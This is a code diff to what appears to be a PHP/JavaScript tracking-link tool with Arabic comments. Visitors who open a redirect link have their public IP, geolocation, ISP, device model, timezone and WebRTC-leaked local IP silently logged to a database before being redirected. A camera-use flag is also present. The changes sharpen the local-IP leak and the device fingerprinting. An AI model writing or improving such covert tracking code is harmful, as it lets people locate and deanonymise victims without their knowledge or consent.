@@ -193,11 +193,16 @@ if (isset($_GET['r'])) {
             $public_ip = get_real_ip();
             $local_ip = $_GET['lip'] ?? 'Cellular / Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';
-            $geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$device_model = $_GET['dmodel'] ?? 'Unknown Model';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
+            $geo = get_ip_details($public_ip);
+            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+            $device = get_device_type($ua);
+            $device_model = $_GET['dmodel'] ?? 'Unknown Model';
+            $tz = $_GET['tz'] ?? 'N/A';
+            $created_at = date('Y-m-d H:i:s');
 
             try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, device_model, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$device_model, $tz,$created_at]);
+                $logStmt = $db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, device_model, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code, $public_ip, $local_ip, $port, $geo['country'], $geo['city'], $geo['lat'], $geo['lon'], $geo['isp'], $device, $device_model, $tz, $created_at]);
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -273,6 +278,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <script>
         const useCam = <?php echo $link_use_cam; ?>;
 
+        // استخراج الـ IP المحلي بدقة تامة لجميع أنواع الأجهزة والشبكات
         function getLocalIP(callback) {
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -280,7 +286,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                 callback("Cellular / Direct");
                 return;
             }
-            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            let pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302"] }] });
             pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
             pc.onicecandidate = function(ice) {
@@ -288,7 +294,8 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                 let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                 if (myIP) {
                     let ip = myIP[1];
-                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                    // فحص نطاقات الأيبيهات المحلية الشائعة
+                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.") || ip.startsWith("169.")) {
                         if (!foundLocal) {
                             foundLocal = true;
                             callback(ip);
@@ -301,44 +308,41 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                 if (!foundLocal) {
                     callback("Cellular / Direct");
                 }
-            }, 100);
+            }, 300);
         }
 
-        // استخراج اسم ورطة موديل الجهاز الحقيقي عبر المتصفح
+        // استخراج اسم ورطة طراز الجهاز الحقيقي بدقة
         function getDeviceModel() {
             let ua = navigator.userAgent;
-            let model = "Unknown Model";
-            
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                return navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"])
-                    .then(uaData => {
-                        return uaData.model ? uaData.model : getFallbackModel(ua);
-                    })
-                    .catch(() => getFallbackModel(ua));
-            }
-            return Promise.resolve(getFallbackModel(ua));
-        }
+            let model = "Standard Device";
 
-        function getFallbackModel(ua) {
+            // استخراج الهواتف الشائعة من الـ User-Agent بوضوح
+            if (ua.includes("iPhone")) return "iPhone";
+            if (ua.includes("iPad")) return "iPad";
+            
             let match = ua.match(/\(([^)]+)\)/);
             if (match && match[1]) {
                 let parts = match[1].split(';');
                 for (let p of parts) {
                     p = p.trim();
-                    if (p.includes("Build/") || p.includes("iPhone") || p.includes("iPad") || p.includes("SM-") || p.includes("Redmi") || p.includes("Pixel")) {
+                    if (p.includes("SM-") || p.includes("Redmi") || p.includes("Pixel") || p.includes("M2") || p.includes("CPH") || p.includes("V2") || p.includes("Honor") || p.includes("HUAWEI")) {
                         return p;
                     }
                 }
-                return parts[parts.length - 1] || "Web Browser";
+                // أخذ آخر جزء مفيد إذا لم يجد الطراز بحرفي Build
+                let lastPart = parts[parts.length - 1].trim();
+                if (lastPart && !lastPart.includes("Apple") && !lastPart.includes("Gecko")) {
+                    return lastPart;
+                }
             }
-            return "Standard Device";
+            return "Android / PC Device";
         }
 
-        document.addEventListener("DOMContentLoaded", async function() {
+        document.addEventListener("DOMContentLoaded", function() {
             const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
             const targetUrl = "<?php echo $target_redirect; ?>";
 
-            let deviceModel = await getDeviceModel();
+            let deviceModel = getDeviceModel();
 
             getLocalIP(function(localIp) {
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
